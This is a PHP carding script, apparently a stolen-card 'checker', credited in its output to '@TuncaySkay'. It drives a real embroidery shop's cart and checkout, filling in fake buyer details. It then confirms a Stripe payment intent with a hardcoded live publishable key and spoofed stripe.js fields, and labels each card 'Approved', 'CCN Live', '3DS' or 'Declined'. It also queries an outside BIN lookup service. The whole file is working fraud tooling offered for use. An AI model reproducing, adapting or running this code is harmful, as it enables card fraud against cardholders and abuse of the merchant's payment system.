<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$card = isset($_GET['card']) ? trim($_GET['card']) : null;

if (!$card || substr_count($card, '|') !== 3) {
    echo json_encode(['basari' => false, 'mesaj' => 'Format: ?card=NUMBER|MM|YY|CVC'], JSON_UNESCAPED_UNICODE);
    exit;
}

list($n, $m, $y, $c) = explode('|', $card);
$m = str_pad($m, 2, '0', STR_PAD_LEFT);
$y = strlen($y) == 2 ? '20'.$y : $y;

// BIN
$bin = substr($n, 0, 6);
$bin_info = bin_bilgi($bin);

// Rastgele bilgiler
$fn = "John";
$ln = "Doe";
$email = "john.doe" . rand(100,999) . "@gmail.com";
$phone = rand(100,999) . rand(100,999) . rand(1000,9999);
$state = "California";
$zip = "90210";

$STRIPE_PK = "pk_live_51RRyAdLKBtCy0WIH0gy3ddK2cth9zXB33leFM7W8Z6MoiaySLA3zSv7Sfa5McdYWug55SZzCAzJ23OzspAJD9KFb00Z9wfJyJ7";
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/149.0.0.0 Safari/537.36";

$cookie_file = tempnam(sys_get_temp_dir(), 'stripe_');

// ============ STEP 1: Sepete ürün ekle ============
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        "action" => "add_to_cart",
        "cart_id" => "",
        "sku" => "40010",
        "choice1" => "PES~Large",
        "quantity" => "1",
        "x" => "122",
        "y" => "2",
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/html/40010.html",
    ],
]);
curl_exec($ch);
curl_close($ch);

// ============ STEP 2: Sepeti görüntüle (cart_id al) ============
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => ["Referer: https://www.advanced-embroidery-designs.com/html/40010.html"],
]);
$cart_html = curl_exec($ch);
curl_close($ch);

// Cart ID'yi cookie'den veya HTML'den bul
$cart_id = "";
// Cookie'den dene
if (preg_match('/storecustomer\s+(\S+)/', file_get_contents($cookie_file), $m)) {
    $cart_id = $m[1];
}
// HTML'den dene
if (!$cart_id && preg_match('/cart_id[= ]+(\d+)/', $cart_html, $m)) {
    $cart_id = $m[1];
}
if (!$cart_id && preg_match('/name="cart_id"\s+value="([^"]+)"/', $cart_html, $m)) {
    $cart_id = $m[1];
}

if (!$cart_id) {
    @unlink($cookie_file);
    echo json_encode(['basari' => false, 'mesaj' => 'Sepet oluşturulamadı'], JSON_UNESCAPED_UNICODE);
    exit;
}

// ============ STEP 3: Checkout ============
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        "shipping_company" => $ln,
        "shipping_name" => $fn,
        "shipping_lastname" => $ln,
        "email" => $email,
        "daytime_phone" => $phone,
        "home_phone" => $phone,
        "shipping_state" => $state,
        "payment_method" => "Credit Card via Stripe",
        "action" => "check_shipping_country",
        "cart_id" => $cart_id,
        "shipping_method" => "",
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1",
    ],
]);
curl_exec($ch);
curl_close($ch);

// ============ STEP 4: Create intent ============
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.advanced-embroidery-designs.com/cgi-bin/cart/create_intent.cgi',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode([
        "cart_id" => $cart_id,
        "shipping_method" => "",
        "shipping_state" => $state,
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json",
        "Origin: https://www.advanced-embroidery-designs.com",
        "Referer: https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi",
        "Accept: application/json",
    ],
]);
$intent_resp = curl_exec($ch);
curl_close($ch);

$intent_data = json_decode($intent_resp, true);
$client_secret = $intent_data['clientSecret'] ?? $intent_data['client_secret'] ?? '';

if (!$client_secret) {
    @unlink($cookie_file);
    echo json_encode([
        'basari' => false,
        'mesaj' => 'Intent oluşturulamadı',
        'debug' => $intent_resp
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

$pi_id = explode('_secret_', $client_secret)[0];

// ============ STEP 5: Confirm payment ============
$guid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0x0fff)|0x4000, mt_rand(0,0x3fff)|0x8000, mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff));

$confirm_data = http_build_query([
    "payment_method_data[type]" => "card",
    "payment_method_data[billing_details][name]" => "$fn $ln",
    "payment_method_data[billing_details][email]" => $email,
    "payment_method_data[billing_details][address][postal_code]" => $zip,
    "payment_method_data[card][number]" => $n,
    "payment_method_data[card][cvc]" => $c,
    "payment_method_data[card][exp_month]" => $m,
    "payment_method_data[card][exp_year]" => substr($y, -2),
    "payment_method_data[guid]" => $guid,
    "payment_method_data[muid]" => $guid,
    "payment_method_data[sid]" => $guid,
    "payment_method_data[payment_user_agent]" => "stripe.js/39914d4bef",
    "payment_method_data[time_on_page]" => rand(10000, 60000),
    "payment_method_data[referrer]" => "https://www.advanced-embroidery-designs.com",
    "expected_payment_method_type" => "card",
    "use_stripe_sdk" => "true",
    "key" => $STRIPE_PK,
    "client_secret" => $client_secret,
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.stripe.com/v1/payment_intents/$pi_id/confirm",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $confirm_data,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_USERAGENT => $UA,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://js.stripe.com",
        "Referer: https://js.stripe.com/",
    ],
]);
$response = curl_exec($ch);
curl_close($ch);
@unlink($cookie_file);

$resp = json_decode($response, true);

if (isset($resp['error'])) {
    $err = $resp['error'];
    $msg = $err['message'] ?? 'Declined';
    $code = $err['code'] ?? '';
    $decline = $err['decline_code'] ?? '';

    if ($code === 'incorrect_cvc' || stripos($msg, 'cvc') !== false) {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => 'CCN Live', 'mesaj' => '✅ Kart Numarası Geçerli (CVV Yanlış)', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } elseif ($code === 'card_declined' || stripos($msg, 'declined') !== false) {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Declined', 'mesaj' => '❌ Reddedildi', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } elseif ($code === 'incorrect_number' || $code === 'invalid_number') {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Invalid', 'mesaj' => '❌ Geçersiz Kart', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } elseif ($code === 'expired_card') {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Expired', 'mesaj' => '❌ Süresi Geçmiş', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Error', 'mesaj' => $msg, 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    }
} else {
    $status = $resp['status'] ?? '';
    if ($status === 'succeeded') {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => 'Approved', 'mesaj' => '✅ Ödeme Onaylandı!', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } elseif ($status === 'requires_action') {
        echo json_encode(['basari' => true, 'kart' => $card, 'durum' => '3DS', 'mesaj' => '⚠️ 3D Secure Gerekli (Kart Geçerli)', 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['basari' => false, 'kart' => $card, 'durum' => 'Unknown', 'mesaj' => '⚠️ ' . ($status ?: 'Bilinmeyen'), 'bin_info' => $bin_info, 'Developer' => '@TuncaySkay'], JSON_UNESCAPED_UNICODE);
    }
}

function bin_bilgi($bin) {
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $resp = @file_get_contents("https://bins.antipublic.cc/bins/$bin", false, $ctx);
    if ($resp) {
        $data = json_decode($resp, true);
        return ['Banka' => $data['bank'] ?? 'Bilinmiyor', 'Ulke' => $data['country'] ?? 'Bilinmiyor', 'Marka' => ($data['brand'] ?? '?'), 'Tur' => ($data['type'] ?? '?')];
    }
    return ['Banka' => 'Bilinmiyor', 'Ulke' => 'Bilinmiyor', 'Marka' => '?', 'Tur' => '?'];
}
?>
